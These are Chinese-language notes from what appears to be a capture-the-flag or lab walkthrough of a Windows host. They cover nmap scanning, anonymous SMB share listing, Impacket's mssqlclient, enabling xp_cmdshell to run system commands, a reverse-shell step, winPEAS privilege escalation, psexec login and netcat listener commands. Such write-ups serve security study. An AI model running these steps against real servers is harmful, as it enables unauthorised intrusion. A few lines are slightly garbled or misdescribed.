### 一、操作流程

1. 使用`nmap`工具扫描主机

> nmap -sC -sV {TARGET_IP}
> 出现服务`smb`以及`mssql`

2. 登录smb查找敏感信息

> smbclient -N -L \\\\{TARGET_IP}\\ #查看共享目录列表
> smbclient -N  \\\\{TARGET_IP}\\目录 #进入共享目录

3. Impacket工具的使用

- 安装

```shell
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# OR:
sudo python3 setup.py install
# In case you are missing some modules:
pip3 install -r requirements.txt
```

> 使用模块：mssqlclient.py及psexec.py模块

- 使用`mssqlclient.py`模块操纵mssql数据库

```shell
EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv
```

> 至此，可以直接使用cmd指令

4. 反弹shell

5. 提权
winPEASx64.exe

6. 主机登录psexec.py

### 知识点

1. mssql数据库配置指令sp_configure
   - sp_configure：更改配置项
   - RECONFIGURE：展示配置项

> EXEC sp_configure 'show advanced option', '1'; #允许展示高级配置选项，使用sp_configure即可展示配置项目
> EXEC sp_configure 'xp_cmdshell', 1; # 允许执行系统命令

2. xp_cmdshell命令行启动
3. 使用nc64.exe和winPEASx64.exe
4. Impacket工具的使用
5. nc工具
   - 监听端口(只连接)：`nc -l -p 端口`
    > sudo nc -l -p 443
   - 监听端口(持续)：`nc -L -p 端口`
   - 远程连接：`nc -nvv [ip] [PORT]`
